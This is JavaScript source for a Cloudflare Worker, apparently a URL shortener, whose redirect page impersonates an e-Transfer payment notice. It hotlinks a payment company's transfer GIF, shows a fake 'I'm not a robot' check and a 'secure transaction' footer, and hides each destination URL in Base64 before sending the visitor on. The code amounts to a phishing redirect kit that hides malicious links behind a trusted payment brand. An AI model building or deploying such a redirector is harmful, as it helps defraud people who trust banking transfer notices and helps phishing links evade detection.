addEventListener('fetch', (event) => {
  event.respondWith(handleRequest(event.request));
});

// BASE_URL определяется на основе заголовка Host
async function handleRequest(request) {
  const BASE_URL = new URL("/", `https://${request.headers.get("host") || "default.example.com"}`).origin;
  console.log(`Request received: ${request.method} ${request.url}`);

  if (request.method === 'POST') {
      return await shortenURL(request, BASE_URL);
  } else if (request.method === 'GET') {
      return await handleRedirect(request, BASE_URL);
  } else {
      return new Response('Method not allowed', { status: 405 });
  }
}

async function shortenURL(request, BASE_URL) {
  try {
      const { url } = await request.json();
      if (!url || !isValidURL(url)) {
          return new Response('Invalid URL', { status: 400 });
      }

      const id = generateID();
      await LINKS.put(id, url);
      const shortURL = `${BASE_URL}/${id}`;

      return new Response(JSON.stringify({ shortURL }), {
          headers: { 'Content-Type': 'application/json',
                     'X-Content-Type-Options': 'nosniff',
                     'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
                     'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://vopay.com data:;", 
                     'Referrer-Policy': 'no-referrer',
                     'Permissions-Policy': 'fullscreen=(), geolocation=()',
                     'X-Frame-Options': 'DENY',
                     'Cache-Control': 'no-store',
                     'Feature-Policy': "geolocation 'none'; microphone 'none'" }
      });
  } catch {
      return new Response('Error processing request', { status: 500 });
  }
}

async function handleRedirect(request, BASE_URL) {
  const url = new URL(request.url);
  const id = url.pathname.slice(1);

  if (!id) {
      return create404Page(BASE_URL);
  }

  const targetURL = await LINKS.get(id);
  if (targetURL) {
      return createRedirectPage(targetURL, BASE_URL);
  } else {
      return create404Page(BASE_URL);
  }
}

function generateID() {
  return Math.random().toString(36).substr(2, 8);
}

function isValidURL(string) {
  try {
      new URL(string);
      return true;
  } catch (_) {
      return false;
  }
}

// Страницы редиректа и 404 с безопасными заголовками
function createRedirectPage(targetURL) {
  const encodedURL = btoa(targetURL); // Кодируем URL в Base64
  const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Security check</title>
          <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://vopay.com data:;">
          <meta name="referrer" content="no-referrer">
          <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
          <meta name="author" content="Dino">
          <meta name="description" content="Secure URL shortening service">
          <style nonce="unique123">
              body {
                  font-family: Arial, sans-serif;
                  text-align: center;
                  padding: 50px;
              }
              .button {
                  padding: 10px 20px;
                  font-size: 16px;
                  color: #000000;
                  background-color: #ffc727;
                  border: none;
                  border-radius: 5px;
                  cursor: pointer;
              }
              .button:hover {
                  background-color: #cc9804;
              }
              footer {
                  margin-top: 50px;
                  font-size: 14px;
                  color: #555;
              }
          </style>
      </head>
      <body>
          <img src="https://vopay.com/wp-content/themes/vopay2019/library/images/send-single-etransfer-gif.gif" alt="Redirecting" width="400" height="200"> 
          <p>To protect your transfer, please confirm that you are not a robot.</p>
          <button class="button" onclick="redirect()">I'm not a robot</button>
          <footer>
              <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
              <p>This is a secure transaction. 🔒</p>
          </footer>
          <script>
              function redirect() {
                  const url = atob('${encodedURL}'); // Декодируем URL
                  window.location.href = url;
              }
          </script>
      </body>
      </html>
  `;
  return new Response(html, {
      headers: { 'Content-Type': 'text/html',
                 'X-Content-Type-Options': 'nosniff',
                 'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
                 'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://vopay.com data:;", 
                 'Referrer-Policy': 'no-referrer',
                 'Permissions-Policy': 'fullscreen=(), geolocation=()',
                 'X-Frame-Options': 'DENY',
                 'Cache-Control': 'no-store',
                 'Feature-Policy': "geolocation 'none'; microphone 'none'" }
  });
}


function create404Page() {
  const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>404 Not Found</title>
          <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;">
          <meta name="referrer" content="no-referrer">
          <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
          <meta name="author" content="Dino">
          <meta name="description" content="Secure URL shortening service">
          <style>
              body {
                  font-family: Arial, sans-serif;
                  text-align: center;
                  padding: 50px;
              }
              h1 {
                  color: #ff0000;
              }
              footer {
                  margin-top: 50px;
                  font-size: 14px;
                  color: #555;
              }
          </style>
      </head>
      <body>
          <h1>404 - Page Not Found</h1>
          <p>The page you are looking for does not exist.</p>
          <footer>
              <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
          </footer>
      </body>
      </html>
  `;
  return new Response(html, {
      headers: { 'Content-Type': 'text/html',
                 'X-Content-Type-Options': 'nosniff',
                 'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
                 'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;", 
                 'Referrer-Policy': 'no-referrer',
                 'Permissions-Policy': 'fullscreen=(), geolocation=()',
                 'X-Frame-Options': 'DENY',
                 'Cache-Control': 'no-store' }
  });
}
